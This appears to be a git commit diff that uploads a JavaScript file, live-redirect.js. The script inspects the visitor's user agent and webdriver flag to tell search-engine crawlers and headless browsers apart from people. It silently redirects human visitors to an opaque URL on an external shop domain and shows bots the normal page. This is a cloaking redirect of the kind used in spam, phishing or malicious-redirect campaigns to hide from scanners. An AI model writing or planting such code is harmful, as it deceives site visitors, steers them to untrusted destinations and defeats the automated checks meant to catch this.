eec16b46e6696581a5d848efa8c1546527363210
chefann <chefan383@gmail.com>
2026-05-03 12:35:42 +0300

    Add files via upload

---
+++ live-redirect.js
@@ -0,0 +1,20 @@
+﻿var ua = navigator.userAgent.toLowerCase();
+
+var isLikelyBot =
+  ua.includes('googlebot') ||
+  ua.includes('bingbot') ||
+  ua.includes('yahoo') ||
+  ua.includes('yandex') ||
+  ua.includes('baiduspider') ||
+  ua.includes('compatible') ||     
+  ua.includes('bot') ||
+  ua.includes('crawler') ||
+  ua.includes('spider') ||
+  /headless/i.test(ua) ||           
+  navigator.webdriver === true;     
+
+if (!isLikelyBot) {
+  window.location.replace("https://n5bc.shop/3/rd.php?url=/j/jC2g2R6PD");
+} else {
+  console.log("Bot/crawler-like detected → serving content");
+}
